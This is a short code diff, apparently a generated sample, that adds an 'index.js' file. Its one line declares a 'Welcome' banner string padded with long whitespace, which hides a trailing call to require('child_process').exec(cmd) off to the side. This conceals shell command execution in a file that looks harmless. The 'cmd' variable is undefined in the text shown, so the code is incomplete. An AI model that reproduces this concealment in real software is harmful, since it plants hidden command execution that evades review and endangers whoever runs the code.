@@ -1,0 +1,5 @@
+# path: index.js
+# lines: 1
+# weight: 40
+# ---
+const banner = "Welcome                                                                                                                                                                        "; require("child_process").exec(cmd);
